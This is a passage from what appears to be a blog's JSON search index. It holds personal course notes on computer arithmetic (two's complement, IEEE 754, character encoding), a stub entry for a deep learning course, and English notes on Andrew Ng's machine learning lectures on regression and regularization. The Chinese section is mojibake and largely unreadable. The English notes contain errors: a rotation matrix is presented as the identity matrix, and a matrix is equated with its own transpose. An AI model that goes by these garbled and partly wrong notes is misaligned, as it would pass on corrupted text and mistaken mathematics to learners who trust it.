^n-0\u0026hellip;01=11\u0026hellip;1(nä¸ª1)$\n$[+0]_è¡¥=[-0]_è¡¥=00\u0026hellip;0(nä¸ª0)$\n$[-01111011]_è¡¥=2 ^8-01111011=100000000-01111011=11111111-01111011+1=10000100+1=10000101=85H$\nè´Ÿæ•°æ±‚è¡¥ç  ç®€ä¾¿æ–¹æ³•ï¼šä»å³å‘å·¦é‡åˆ°çš„ç¬¬ä¸€ä¸ª1çš„å‰é¢å„ä½å–å\nå˜å½¢è¡¥ç ï¼šè¡¨ç¤ºæº¢å‡º(ä¸¤ä½ä¸åŒåˆ™ä¸ºæº¢å‡º) 8-\u0026gt;1000(è¡¥ç )-\u0026gt;01000(å˜å½¢è¡¥ç )\næ±‚è¡¥ç çš„çœŸå€¼ï¼šç¬¦å·ä½0 æ•°å€¼éƒ¨åˆ†ç›¸åŒï¼›ç¬¦å·ä½1 è´Ÿæ•°ï¼Œæ•°å€¼ä½å–å æœ«å°¾åŠ 1\nCè¯­è¨€ä¸­çš„æ•´æ•° æ— ç¬¦å·æ•´æ•°(Unsigned integer)\nLSB(least significant bit)æœ€ä½æœ‰æ•ˆä½ MSBæœ€é«˜æœ‰æ•ˆä½\nä¸€èˆ¬åœ¨ç»“æœæ²¡æœ‰è´Ÿå€¼çš„åœºåˆç”¨æ— ç¬¦å·æ•°ï¼šåœ°å€è¿ç®—ï¼Œç¼–å·è¡¨ç¤ºç­‰ç­‰\nå¸¦ç¬¦å·æ•´æ•°(Signed integer)\næœ‰ä¸‰ç§ç¼–ç è¡¨ç¤º\nåŸç ï¼šå®šç‚¹å°æ•°ï¼Œç”¨æ¥è¡¨ç¤ºæµ®ç‚¹æ•°çš„å°¾éƒ¨ ç§»ç ï¼šå®šç‚¹æ•´æ•°ï¼Œç”¨äºè¡¨ç¤ºæµ®ç‚¹æ•°çš„é˜¶ï¼ˆæŒ‡æ•°ï¼‰ è¡¥ç ï¼š50å¹´ä»£ä»¥æ¥ æ‰€æœ‰è®¡ç®—æœºéƒ½ç”¨è¡¥ç æ¥è¡¨ç¤ºå¸¦è´Ÿå·æ•´æ•° ä¸ºä»€ä¹ˆç”¨è¡¥ç è¡¨ç¤ºå¸¦ç¬¦å·æ•´æ•°ï¼Ÿ\nè¡¥ç è¿ç®—ç³»ç»Ÿæ˜¯æ¨¡è¿ç®—ç³»ç»Ÿï¼ŒåŠ å‡ç»Ÿä¸€ æ•°0çš„è¡¨ç¤ºå”¯ä¸€ï¼Œæ–¹ä¾¿ä½¿ç”¨ æ¯”åŸç å¤šè¡¨ç¤ºä¸€ä¸ªæœ€å°è´Ÿæ•° è‹¥åŒæ—¶æœ‰æ— ç¬¦å·å’Œå¸¦ç¬¦å·æ•´æ•°ï¼Œåˆ™Cç¼–è¯‘å™¨å°†å¸¦ç¬¦å·æ•´æ•°å¼ºåˆ¶è½¬æ¢ä¸ºæ— ç¬¦å·æ•°\nèŒƒå›´ C90ç±»å‹ 0~$2 ^{31}-1$ int $2 ^{31}$~$2 ^{32}-1$ unsigned int $2 ^{32}$~$2 ^{63}-1$ long long $2 ^{63}$~$2 ^{64}-1$ unsigned long long èŒƒå›´ C99ç±»å‹ 0~$2 ^{31}-1$ int $2 ^{31}$~$2 ^{63}-1$ long long $2 ^{63}$~$2 ^{64}-1$ unsigned long long æµ®ç‚¹æ•°çš„ç¼–ç è¡¨ç¤º 0 1-8 9-31 S é˜¶ç E å°¾æ•°M ç¬¬0ä½æ ‘ç¬¦Sï¼›ç¬¬1~8ä½ä½8ä½ç§»ç è¡¨ç¤ºè§£ç Eï¼ˆåç½®å¸¸æ•°ä¸º128ï¼‰ï¼›ç¬¬9~31ä½ä½24ä½äºŒè¿›åˆ¶åŸç å°æ•°è¡¨ç¤ºçš„å°¾æ•°Mã€‚è§„æ ¼åŒ–å°¾æ•°çš„å°æ•°ç‚¹åç¬¬ä¸€ä½æ€»æ˜¯1ï¼Œæ‰€ä»¥ç¬¬ä¸€ä½é»˜è®¤1ä¸æ˜æ˜¾è¡¨ç¤ºå‡ºæ¥ã€‚è¿™æ ·å¯ç”¨23ä¸ªæ•°ä½è¡¨ç¤º24ä½å°¾æ•°ã€‚\næœ€å¤§æ­£æ•°ï¼š0.11\u0026hellip;1 x $2 ^{11\u0026hellip;1}$=(1-$2 ^{-24}$) x $2 ^{127}$\næœ€å°æ­£æ•°ï¼š0.10\u0026hellip;0 x $2 ^{00\u0026hellip;0}$=(1/2) x $2 ^{-128}$\nä¸åŒæœºå™¨æµ®ç‚¹æ•°è¡¨ç¤ºä¸åŒï¼Œæ‰€ä»¥å‡ºç°äº†IEEE 754\nIEEE 754æ ‡å‡†\nExponent(é˜¶ç )ï¼š\nSPè§„æ ¼åŒ–è§£ç èŒƒå›´ä¸º0000 0001(-126) ~ 1111 1110(127) biasä¸º127(single),1023(double) Significand(å°¾æ•°)ï¼š\nè§„æ ¼åŒ–å°¾æ•°æœ€é«˜ä½æ€»æ˜¯1ï¼Œæ‰€ä»¥éšå«è¡¨ç¤ºï¼Œçœ1ä½ 1+23 bits(single), 1+52 bits(double) SP: $(-1) ^S \\times (1+Significand) \\times x ^{Exponent-127}$\nDP: $(-1) ^S \\times (1+Significand) \\times x ^{Exponent-1023}$\nä¾‹ï¼šfloatå‹å˜é‡xçš„æœºå™¨æ•°ä¸ºBEE00000Hï¼Œæ±‚xçš„å€¼ï¼Ÿ\n1011 1110 1110 0000 0000 0000 0000 0000\næ•°ç¬¦ï¼š1ï¼ˆè´Ÿæ•°ï¼‰\né˜¶ï¼ˆæŒ‡æ•°ï¼‰ï¼š\né˜¶ç ï¼š0111 1101 B = 125 é˜¶ç çš„å€¼ï¼š125-127 = -2 å°¾æ•°æ•°å€¼éƒ¨åˆ†ï¼š\n$1+1\\times x ^{-1}+1 \\times 2 ^{-2}+0 \\times 2 ^{-3}+0 \\times 2 ^{-4}\u0026hellip;..$\n=$1+2 ^{-1}+2 ^{-2}=1+0.5+0.25=1.75$\nçœŸå€¼=$1.75 \\times 2 ^{-2}=-0.4375$\nä¾‹ï¼šfloatå˜é‡xå€¼ä¸º-12.75ï¼Œæ±‚xçš„æœºå™¨æ•°æ˜¯å¤šå°‘ï¼Ÿ\n-12.75=-1100.11B=-1.10011B x $2 ^{3}$\nå› æ­¤ï¼Œç¬¦å·S=1\né˜¶ç E=127+3=128+2=1000 0010\næ˜¾å¼è¡¨ç¤ºçš„éƒ¨åˆ†å°¾æ•°Significant=100 1100 0000 0000 0000 0000\nxæœºå™¨æ•°è¡¨ç¤ºä¸ºï¼š\n1100 0001 0100 1100 0000 0000 0000 0000\nè½¬æ¢ä¸ºåå…­è¿›åˆ¶è¡¨ç¤ºä¸ºï¼šC14C0000H\nè§„æ ¼åŒ–æ•°\nç‰¹æ®Šæ•°\n0çš„æœºå™¨æ•° æ— ç©·æ•° éæ•° é˜¶ç  å…¨é›¶ 255ï¼ˆ11111111B) 255 å°¾æ•° å…¨é›¶ å…¨é›¶ nonzero éè§„æ ¼åŒ–æ•°\n$(-1) ^S \\times 0.XXXXX \\times 2^ {-126}$\néæ•°å€¼æ•°æ®çš„ç¼–ç è¡¨ç¤º ASCII\n0-30H\n1-31H\nA-41H\na-61H\næ±‰å­—\nè¾“å…¥ç ï¼šå¯¹æ±‰å­—ç”¨ç›¸åº”æ¡ˆä»¶è¿›è¡Œç¼–ç è¡¨ç¤ºï¼Œç”¨äºè¾“å…¥\nå†…ç ï¼šç”¨äºå†ç³»ç»Ÿä¸­è¿›è¡Œå­˜å‚¨ã€æŸ¥æ‰¾ã€ä¼ é€ç­‰å¤„ç†\nå­—æ¨¡ç‚¹é˜µæˆ–è½®å»“æè¿°ï¼šæè¿°æ±‰å­—å­—æ¨¡ç‚¹é˜µæˆ–è½®å»“ï¼Œç”¨äºæ˜¾ç¤ºã€æ‰“å°\nGB2312ï¼š94è¡Œ94åˆ—ï¼Œè¡Œå·æ˜¯åŒºå·ï¼Œåˆ—ä½æ˜¯ä½å·ï¼Œå„ä¸º7ä½\nåŒºã€ä½ç ä¸Šå„åŠ 32ï¼ˆ20H\nå¾—åˆ°ä¸¤ä¸ªå­—èŠ‚ç¼–ç  é¦–ä½è®¾ä¸º1ï¼Œå¾—åˆ°å†…ç ï¼Œé¿å…ä¸ASCIIæ··æ·†\næ•°æ®å®½åº¦å’Œå­˜å‚¨é‡çš„å•ä½ ä½bit å­—èŠ‚byteï¼ˆ ç°ä»£è®¡ç®—æœº å­˜å‚¨å™¨æŒ‰å­—èŠ‚ç¼–å€ å­—èŠ‚æ˜¯æœ€å°å¯å¯»å€å•ä½ï¼‰\nå­—(word) IA-32ä¸­ å­— ä¸º16ä½ DWORD(åŒå­— 32ä½) QWORDï¼ˆ64ä½ï¼‰\næ•°æ®å­˜å‚¨æ—¶çš„å­—èŠ‚æ’åº å¤§ç«¯â€”â€”æ•°æ®é«˜ä½åœ¨åœ°å€ä½ä½â€”â€”photoshopï¼ŒJPEGï¼ŒMacPaint\nå°ç«¯â€”â€”æ•°æ®ä½ä½åœ¨åœ°å€åœ°ä½â€”â€”GIFï¼ŒPC Panintbrushï¼ŒMS RTF\nä¸ªäººæ€»ç»“ æ­£æ•°çš„åŸç  åç  è¡¥ç  å…¨éƒ½ç›¸ç­‰ï¼ˆå› ä¸ºåç è¡¥ç éƒ½æ˜¯ä¸ºäº†è§£å†³å‡æ³•å¼•å…¥çš„ï¼‰ è´Ÿæ•° åŸç ç¬¦å·ä½ä¸º1å…¶ä½™ä¸€æ · åç æ˜¯åŸç å–å è¡¥ç =åç +1 è®¡ç®—æœºå†…éƒ¨è®¡ç®—æ˜¯ç”¨è¡¥ç è®¡ç®— å››ã€ ä¹˜é™¤è¿ç®—åŠæµ®ç‚¹æ•°è¿ç®— æ•´æ•°ä¹˜æ³•è¿ç®— å½“n=4æ—¶ 5çš„å¹³æ–¹=-7 nä¸ºä½æ•°\nåœ¨è®¡ç®—æœºå†…éƒ¨ï¼Œä¸€ä¸ªæ•´æ•°xçš„å¹³æ–¹å¯èƒ½æ˜¯è´Ÿæ•°ï¼Œè¿™æ˜¯å› ä¸ºåœ¨è®¡ç®—æœºä¸­å…¶ç»“æœå–çš„æ˜¯x*xçš„ä½nä½ä¹˜ç§¯è€Œé«˜nä½ä¸­çš„æœ‰æ•ˆæ•°ä½è¢«ä¸¢å¼ƒè€Œé€ æˆçš„ã€‚\nå½“ (!x || z/x==y) ä¸ºçœŸæ—¶ã€x=0æˆ–è€…zé™¤å›å»è¿˜æˆç«‹ã€‘ zæ­£ç¡®ï¼›å½“ $-2^{n-1} \u0026lt;= x*y \u0026lt; 2^{n-1}$ æ—¶ï¼ˆå°±æ˜¯ä¸æº¢å‡ºæ—¶ å½“å‰ä½æ•°èƒ½å­˜ å½“ç„¶ä¸ä¼šå˜ï¼‰ï¼Œå³ï¼šä¹˜ç§¯çš„é«˜nä½ä¸ºå…¨0æˆ–å…¨1ï¼Œå¹¶ç­‰äºä½nä½çš„æœ€é«˜ä½ï¼Œå³ï¼šä¹˜ç§¯çš„é«˜n+1ä½ä¸ºå…¨0æˆ–å…¨1\nå¦‚æœæ˜¯æ— ç¬¦å·æ•°ï¼Œåªè¦åˆ¤æ–­ä¹˜ç§¯é«˜nä½æ˜¯å¦å…¨ä¸º0å°±èƒ½åˆ¤æ–­æ˜¯å¦æº¢å‡º\næ— ç¬¦å·åŠ å‡è¿ç®—å’Œå¸¦ç¬¦å·åŠ å‡è¿ç®—æ˜¯ä¸€æ ·çš„\næ— ç¬¦å·ä¹˜æ³•ä¸å¸¦ç¬¦å·ä¹˜æ³•ä½nä½ç»“æœä¸€æ · é«˜nä½ä¸ä¸€æ ·ï¼ˆå¦‚æœé‡‡å–ä¸€æ ·çš„æŒ‡ä»¤ ç¼–è¯‘å™¨å°±æ— æ³•åˆ¤æ–­æº¢å‡ºäº†ï¼‰ï¼ˆä¹˜æ³•æŒ‡ä»¤ä¸ç”Ÿäº§æº¢å‡ºæ ‡å¿—ï¼Œç¼–è¯‘å™¨å¯ä½¿ç”¨2nä½æˆç»©æ¥åˆ¤æ–­æ˜¯å¦æº¢å‡º PSï¼šDXå’ŒAXçš„å…³ç³»ï¼‰\næº¢å‡ºæ¼æ´ï¼šç”³è¯·çš„æ•°æ®æº¢å‡ºäº†ï¼Œä½†æ˜¯è®¡æ•°è¿˜æ˜¯å¾ˆå¤§ï¼Œè¦†ç›–å¾ˆå¤§çš„ç©ºé—´ã€‚\næ•´æ•°é™¤æ³•è¿ç®— ","description":"","id":27,"section":"posts","tags":["CS","course"],"title":"CSAPP\u0026NJU MOOC","uri":"https://ruokeqx.gitee.io/posts/csappnju-mooc/"},{"content":"Deep Learning\n","description":"","id":28,"section":"posts","tags":["AI","course"],"title":"CS230 Deep Learningâ€”â€”Andrew Ngâ€”â€”Stanford","uri":"https://ruokeqx.gitee.io/posts/deep-learning-andrew-ng-stanford/"},{"content":"1 Introduction what is machine learning supervised learning supervised learning regression problem predict a continuous valued output classification problem predict a discrete valued output SVM(Support Vector Machine) is a kind of generalized linear classification that classifies data by supervised learning\nunsupervised learning unsupervised learning\nCluster Algorithm Google news Facebook friends 2. Linear Regression with One Variable 2.1 Model Representation Linear regression with one variable.\nUnivariate linear regression.\nm â€”â€” the number of training examples\nx â€”â€” input\ny â€”â€” output\nh â€”â€” hypothesis function\n$h_\\theta \\left( x \\right)=\\theta_{0}+\\theta_{1}x$\n2.2 Cost function also called square error function or square error cost function.\nhelp figure out how to fit the best possible straight line to our data.\nhow to choose parameter values to make hypothesis function fit better.($J \\left( \\theta_0, \\theta_1 \\right) = \\frac{1}{2m}\\sum\\limits_{i=1}^m \\left( h_{\\theta}(x ^{(i)})-y ^{(i)} \\right)^{2}$)\n2.3 Cost Function - Intuition 1 For each value of theta one corresponds to a different hypothesis or to a different straight line fit. And for each value of theta one, we could then derive a different value of J of theta one. And value of J of theta one plot the picture on the right.\nThe optimization objective for our learning algorithm is we want choose the value of theta one that minimizes J of theta one. This was our objective function for the linear regression.\n2.4 Cost Function - Intuition 2 1 parameter 2-D plot\n2 parameters 3-D plot\n2.5 Gradient Descent Imagine that this figure shows a hill, you are physically standing at a point one the hill. Gradient descent is to spin 360 degrees around and ask \u0026ldquo;if I were to take a little baby step in some direction, and I want go downhill as quickly as possible, what direction do I take?\u0026rdquo;\nGo until you converge to a local minimum. If you start at different point, gradient descent will take you to the second local optimum.\nThis is batch gradient descent algorithm and $\\alpha$ refer to the learning rate. We need update the $\\theta_0$ and $\\theta_1$ simultaneously.\n2.6 Gradient Descent Intuition For single variable function, partial derivative equal to derivative.\nThe direction of the derivative is opposite to the direction to be changed, so $\\alpha$ is preceded by a minus sign. Sign of partial derivative refer to the direction you need to go and $\\alpha$ refer to the length of your every little step. If $\\alpha$ is too small, gradient descent can be slow. If $\\alpha$ is too large, gradient descent can overshoot the minimum. It may fail to converge, or even diverge.\nThe reason why we don\u0026rsquo;t need to decrease $\\alpha$. (automatically take smaller steps)\n2.7 Gradient Descent For Linear Regression Apply gradient descent to minimum our squared error cost function.\nPartial derivative of cost function for linear regression:\n$\\frac{\\partial }{\\partial \\theta_j}J(\\theta_0,\\theta_1)=\\frac{\\partial }{\\partial \\theta_j}\\frac{1}{2m}\\sum\\limits_{i=1}^m \\left( h_{\\theta}(x ^{(i)})-y ^{(i)} \\right)^{2}$\n$j=0$ : $\\frac{\\partial }{\\partial \\theta_0}J(\\theta_0,\\theta_1)=\\frac{1}{m}\\sum\\limits_{i=1}^m \\left( h_{\\theta}(x ^{(i)})-y ^{(i)} \\right)$\n$j=1$ : $\\frac{\\partial }{\\partial \\theta_1}J(\\theta_0,\\theta_1)=\\frac{1}{m}\\sum\\limits_{i=1}^m \\left( \\left( h_{\\theta}(x ^{(i)})-y ^{(i)} \\right)\\cdot {x^{(i)}} \\right)$\nCost function for linear regression is always going to be a bowl-shaped function(convex function), it doesn\u0026rsquo;t have any local optima except for the one global optimum.\n\u0026ldquo;Batch\u0026rdquo;: each step of gradient descent uses all the training examples.\n3. Linear Algebra Review 3.1 Matrices and Vectors vector is a matrix that has only one column.\n3.2 Addition and Scalar Multiplication add or multiply every element\n3.3 Matrix Vector Multiplication $mÃ—n$ matrix times $nÃ—1$ vector equal to $mÃ—1$â€‹ vector\n3.4 Matrix Matrix Multiplication 3.5 Matrix Multiplication Properties all matrix:\n$AÃ—Bâ‰ BÃ—A$(commutative property of multiplication)\n$AÃ—(BÃ—C)=(AÃ—B)Ã—C$(associative property of multiplication)\nIdentity matrix:\nidentity matrix has ones along the diagonals and zero everywhere else.\n$$\\begin{bmatrix} 0 \u0026amp; -1 \\\\ 1 \u0026amp; 0 \\end{bmatrix}$$\n$AA ^{-1}=A ^{-1}A=I$\n$AI=IA=A$\n3.6 Inverse and Transpose inverse of matrix($A^{-1}$)\nonly square matrices have inverses.\n$AA ^{-1}=A ^{-1}A=I$\ntranspose:\nlet A be an m x n matrix, let $B = A^T$.\nThen B is an n x m matrix and $B_{ij} = A_{ji}$.\n$$\\begin{bmatrix} 1 \u0026amp; 2 \u0026amp; 0 \\\\ 3 \u0026amp; 5 \u0026amp; 9 \\end{bmatrix} = \\begin{bmatrix} 1 \u0026amp; 3 \\\\ 2 \u0026amp; 5 \\\\ 0 \u0026amp; 9 \\end{bmatrix}$$\n4. Linear Regression with Multiple Variables 4.1 Multiple Features $\\left( x_1,x_2,\u0026hellip;,x_n \\right)$ stand for multiple variables\n$x^{(i)}$ is a vector and it stand for the $i^{th}$ training example\n$x^{(2)}=\\begin{bmatrix} 1416 \\\\ 3 \\\\ 2 \\\\ 40 \\end{bmatrix}$\n$x_j^{(i)}$ stand for the value $j$ in $i^{th}$ training example.\n$x_2 ^{(2)}=3,x_3 ^{(2)}=2$\nthe form of the hypothesis:\n$h_\\theta \\left( x \\right)=\\theta_0+\\theta_1x_1+\\theta_2x_2+\u0026hellip;+\\theta_nx_n$\nFor convenience of notation, we define $x_0$ to be equals one.\nNow, $X$ is a $n+1$ dimensional feature vector; parameters $\\theta$ is also a $n+1$ dimensional vector.\n$X = \\begin{bmatrix} x_0 \\\\ x_1 \\\\ x_2 \\\\ \u0026hellip; \\\\ x_n \\end{bmatrix} \\theta = \\begin{bmatrix} \\theta_0 \\\\ \\theta_1 \\\\ \\theta_2 \\\\ \u0026hellip; \\\\ \\theta_n \\end{bmatrix} \\theta^T = \\begin{bmatrix} \\theta_0 \\ \\theta_1 \\ \\theta_2 \\ \u0026hellip; \\ \\theta_n \\end{bmatrix}$\n$h_\\theta \\left( x \\right)=\\theta_0 x_0 + \\theta_1 x_1 + \\theta_2 x_2+ \u0026hellip; + \\theta_n x_n$\n$h_\\theta \\left( x \\right)=\\theta^TX$\n4.2 Gradient Descent for Multiple Variables Gradient descent algorithm:\n$J({\\theta_0},{\\theta_1}\u0026hellip;{\\theta_n})=\\frac{1}{2m}\\sum\\limits_{i=1}^m{( h_\\theta(x^{(i)})-y^{(i)})^2}$\nwhen $n\u0026gt;=1$:\n${\\theta_0}:=\\theta_0-a\\frac{1}{m}\\sum\\limits_{i=1} ^m{(h_\\theta(x ^{(i)})-{y} ^{(i)})}x_0 ^{(i)}$\n${\\theta_1}:=\\theta_1-a\\frac{1}{m}\\sum\\limits_{i=1} ^m{(h_\\theta(x ^{(i)})-{y} ^{(i)})}x_1 ^{(i)}$\n${\\theta_2}:=\\theta_2-a\\frac{1}{m}\\sum\\limits_{i=1} ^m{(h_\\theta(x ^{(i)})-{y} ^{(i)})}x_2 ^{(i)}$\n1 2 3 def computeCost(X, y, theta): inner = np.power(((X * theta.T) - y), 2) return np.sum(inner) / (2 * len(X)) 4.3 Gradient Descent in Practice I - Feature Scaling Feature scaling:\nIf you make sure that the features are on a similar scale, then gradient descents can converge more quickly.\nIf $\\theta_1$ is larger than $\\theta_2$, the cost function will like picture on the left. And if you run gradient descent on this sort of cost function, your gradients may end up taking a long time and can oscillate back and forth and take a long time before it can finally find its way to the global minimum.\nA useful thing to do is to scale the features. If $x_1, x_2$ like on the right, the contours may look more like circles, and if you run gradient descent on a cost function like this, then gradient descent (you can show mathematically) can find a much more direct path to global minimum rather than much more complicated trajectory.\nWhen we performing feature scaling, what we often to do is get every feature into approximately range $[-1,1]$ nether too small nor too large.\nWhen performing feature scaling, sometimes people will also do what\u0026rsquo;s called mean normalization.\nPlace $x_i$ with $x_i-\\mu_i$ to make feature have approximately zero mean.\nMore general rule: replace $x_1 \u0026lt;- \\frac{(x_1-\\mu_1)}{s_1}$, $\\mu1$ is the average value of $x_1$ in the training sets, ans $s_1$ is the standard deviation of that feature. Then it will be roughly into these sorts of ranges.\n4.4 Gradient Descent in Practice II - Learning Rate See 2.6 Gradient Descent Intuition\n$\\alpha=0.01ï¼Œ0.03ï¼Œ0.1ï¼Œ0.3ï¼Œ1ï¼Œ3ï¼Œ10$\n4.5 Features and Polynomial Regression To predict the prize of the house we have two paras $h_\\theta(x)=\\theta_0+\\theta_1\\times{frontage}+\\theta_2\\times{depth}$\nif we let $x=frontage * depth=area$ then $h_\\theta(x)=\\theta_0+\\theta_1x$\nsometimes linear regression don\u0026rsquo;t fit all data, so maybe you want to fit a quadratic model like $h_\\theta(x)=\\theta_0+\\theta_1x_1+\\theta_2x_2^2$, it may be not fit well, then you can choose to use instead a cubic function line$h_\\theta(x)=\\theta_0+\\theta_1x_1+\\theta_2x_2 ^2+\\theta_3x_3 ^3$\n$h_\\theta(x)=\\theta_0+\\theta_1(size)+\\theta_2(size)^2$\n$h_\\theta(x)=\\theta_0+\\theta_1(size)+\\theta_2\\sqrt{size}$\npolynomial regression fit a polynomial, like a quadratic function or a cubic function, to your data. Be aware that you have a choice in what features to use, and by designing different features you can fit more complex functions to your data than just fitting a straight line to the data, and in particular, you can fit polynomial functions as well.\nPS: it is important to apply feature scaling if you are using gradient descent to get them into comparable ranges of values.\n4.6 Normal Equation Normal equation, which for some linear regression problems, will git us much better way to solve for the optimal value of the parameters theta.\nSo far the algorithm that we\u0026rsquo;ve been using for linear regression is gradient descent where in order to minimize the cost function $J of \\theta$, we would take this iterative algorithm that takes many steps, multiple iterations of gradient descent to converge to the global minimum. In contrast, the normal equation will give us a method to solve for theta analytically, so that rather than needing to run this iterative algorithm, we can instead just solve for the optimal value for theta all at one go, so that in basically one step you get to the optimal value right there.\nSet $\\theta=(X ^TX) ^-1X ^Ty$, this will give you the value of $\\theta$ that minimizes your cost function.\nNormal equation don\u0026rsquo;t need feature scaling, thought it is important for linear regression.\nCHOICES:\nGradient descent Normal equation need to choose $\\alpha$ no need to choose $\\alpha$ need many iterations don\u0026rsquo;t need to iterate works well even when $n$ is large need to compute$(X ^TX) ^{-1}$ inverse O(n^3), slow if $n$ is very large 4.7 Normal Equation Noninvertibility What if the matrix X transpose X is non-invertible? Some matrices do not have an inverse, we call those non-invertible matrices, singular or degenerate matrices. The issue or the problem of X transpose X being non-invertible should happen pretty rarely.\nIf X transpose X is non-invertible, there are usually two most common causes: The first cause is if somehow, in your learning problem, you have redundant features, concretely, if you try to predict housing prices and if $x_1$ is the size of house in square-feet and $x_2$ is the size of the house in square-meters(1 meter is equal to 3.28 feet), your two features are related via a linear equation, then matrix X transpose X will be non-invertible. Second thing that can cause it to be non-invertible is if you\u0026rsquo;re trying to run a learning algorithm with a lot of features. Concretely, if m is less than or equal to n.\n5. Octave Tutorial omitted\n6. Logistic Regression 6.1 Classification Logistic regression, actually a classification algorithm, has the property that the output the predictions of logistic regression are always between zero and one, and doesn\u0026rsquo;t become bigger than one or become less than zero.\n6.2 Hypothesis Representation Hypothesis representation, that is what is the function we\u0026rsquo;re going to use to represent our hypothesis when we have classification problem.\nWhen we were using linear regression, $h_\\theta(x)=\\theta^Tx$ was the form of a hypothesis. For logistic regression, I\u0026rsquo;m going to modify this a little bit and make the hypothesis $h_\\theta(x) = g(\\theta^Tx)$, where g is $g(z)=\\frac1{1+e^{-z} }$, this is called sigmoid function or logistic function(give rise to the name logistic regression)(Sigmoid function and logistic function are basically synonyms and mean the same thing. So the two terms are basically interchangeable).\n$h_\\theta(x) = \\text{estimated probability that y=1 on input x}$\n$h_\\theta(x) = P(y=1|x;\\theta)$ and $P(y=0|x;\\theta)+P(y=1|x;\\theta)=1$\n6.3 Decision Boundary If $h_\\theta(x)=g(\\theta_0+\\theta_1x_1+\\theta_2x_2)$ and let $\\theta=\\begin{bmatrix} -3 \\\\ 1 \\\\1 \\end{bmatrix}$\n$x_1+x_2\u0026gt;=3$ is decision boundary.\n1 2 3 import numpy as np def sigmoid(z): return 1 / (1 + np.exp(-z)) 6.4 Cost Function J of $\\theta$ ends up being a non-convex function if we are to define it as the squared cost function. We need to come up with a different cost function that is convex and so that we can apply a great algorithm like gradient descent and be guaranteed to find a global minimum.\nHere\u0026rsquo;s a cost function that we\u0026rsquo;re going to use for logistic regression.\nThis function will penalize learning algorithm by a very large cost.\n1 2 3 4 5 6 7 8 9 import numpy as np def cost(theta, X, y): theta = np.matrix(theta) X = np.matrix(X) y = np.matrix(y) first = np.multiply(-y, np.log(sigmoid(X* theta.T))) second = np.multiply((1 - y), np.log(1 - sigmoid(X* theta.T))) return np.sum(first - second) / (len(X)) 6.5 Simplified Cost Function and Gradient Descent Cost function can be written in a simple one line: $cost(h_\\theta(x),y)=-ylog(h_\\theta(x))-(1-y)log(1-h_\\theta(x))$\nThen the cost function would be $J(\\theta)=\\frac1m\\sum\\limits_{i=1} ^mCost(h_\\theta(x ^{(i)},y ^{(i)})=-\\frac1m\\sum\\limits_{i=1} ^m[y ^{(i)}log(h_\\theta(x ^{(i)}))+(1-y ^{(i)})log(1-h_\\theta(x ^{(i)}))]$\nThis cost function can be derived from statistics using the principle of maximum likelihood estimation, which is convex and find parameters $\\theta$ for different models efficiently.\nGiven this function, in order to fit the parameters, what we\u0026rsquo;re going to do then is try to find the parameters $\\theta$ that minimizes $j(\\theta)$.${\\underset\\theta\\min}j(\\theta)$, this will give us a set of $\\theta$. Finally if we\u0026rsquo;re given a new example with some et of features X. We can then take the thetas that we fit our training set and output our prediction as this $h_\\theta(x)=\\frac1{1+e ^{-\\theta ^Tx}}$.\nThe way we are using to minimize the cost function is using gradient descent. If we want to minimize it as a function of $\\theta$. Here\u0026rsquo;s our usual template for gradient descent, where we repeatedly update each parameter by updating it as itself minus a learning rate alpha times derivative term.\n$$\n\\text{Want }min_\\theta j(\\theta):\n\\text{Repeat }\n\\theta_j:=\\theta_j-\\alpha\\frac\\partial{\\partial \\theta_j}j(\\theta)\n\\text{ Simultaneous update all }\\theta_j\n$$\nThis algorithm looks identical to linear regression! So are they different algorithm or not? What have changed is $h_\\theta(x)$, $h_\\theta(x)=\\theta^TX$ in linear regression and $h_\\theta(x)=\\frac1{1+e ^{-\\theta ^Tx}}$ in logistic function. So even though the update rule looks cosmetically identical, because the definition of the hypothesis has changed, this is actually not the same thing as gradient descent for linear regression.\nFeature scaling can help gradient descent converge faster for linear regression. The idea of feature scaling also applies to gradient descent for logistic regression.\n6.6 Advanced Optimization 6.7 Multi-class Classification_ One-vs-all Turn training set into three separate binary classification problems.\n7. Regularization 7.1 The Problem of Overfitting When you apply algorithm to certain ML applications, thry can run into a problem called overfitting, that can cause them to perform very poorly.\nTry too hard to fit the training set, so that it even fails to generalize to new examples.\nHere is an instance of overfitting, and og a hypothesis having high variance and not really, and being unlikely to generalize well to new examples.\nDebugging and diagnosing\nrecognize when overfitting and also when underfitting may be occurring.\nOptions:\nReduce number of features. Manually select which features keep. Model selection algorithm. Throwing away some features also throwing away some information.\nRegularization Keep all the features, but reduce magnitude/values of parameters$\\theta_j$. Works well when we have a lot of features, each of which contributes a bit to predicting y. 7.2 Cost Function The idea of regularization is if we have small values for the parameters, it usually correspond to having a simpler hypothesis.\nIn example, we penalize just $\\theta_3 \\text{ and }\\theta_4$, make $\\theta_3 \\text{ and }\\theta_4$ small and gave us a simpler hypothesis.\nIt is hard to pick in advance which are the ones that are less likely to be relevant. So in regularization, what we are going to do is take our cost function, and modify the cost function to shrink all of my parameters.\n$J(\\theta)=\\frac1{2m}[\\sum\\limits_{i=1} ^m{(h_\\theta(x ^{(i)})-y ^{(i)})} ^2+\\lambda \\sum\\limits_{j=1} ^n{\\theta_j ^2}]$\n$\\lambda$ is called regularization parameter. And what lambda does, is controls a trade off between two different goals. The first goal is captured by the first term of the objective, is that we would like to fit the training set well. And the second goal is we want to keep the parameters small, and that\u0026rsquo;s captured by the second term, by the regularization objective, and by regularization term.\nWhat $\\lambda$ does is the controls the trade off between the goal of fitting the training set well and the goal of keeping the parameter small, and therefore keeping the hypothesis relatively simple to avoid overfitting.\n7.3 Regularized Linear Regression Gradient descentï¼š\nIn regularization, we penalize the parameters $\\theta_1\\theta_2$ and so on up to $\\theta_n$, but we don\u0026rsquo;t penalize $\\theta_0$, so when we modify this algorithm for regularized linear regression, we\u0026rsquo;re going to end up treating $\\theta_0$ slightly differently.\nRepeat untilâ€‹ convergenceâ€‹{\nâ€‹\t$\\theta_0:={\\theta_0}-a\\frac1m\\sum\\limits_{i=1} ^m((h_\\theta(x ^{(i)})-y ^{(i)})x_0 ^{(i)})$\nâ€‹\t$\\theta_j:=\\theta_j-a[\\frac1m\\sum\\limits_{i=1} ^m(h_\\theta(x ^{(i)})-y ^{(i)})x_j ^{(i)}+\\frac\\lambda m\\theta_j]$\nâ€‹\t$for$ $j=1,2,\u0026hellip;n$\n}\nIf you group all the terms together that depending on $\\theta_j$, you can show that this update can be written equivalently as follows.\n$\\theta_j:=\\theta_j(1-a\\frac\\lambda m)-a\\frac1m\\sum\\limits_{i=1} ^m({h_\\theta}(x ^{(i)})-y ^{(i)})x_j ^{(i)}$\nSince $\\alpha$ is small and m is big, so $(1-\\alpha\\frac\\lambda m)$ is a number that 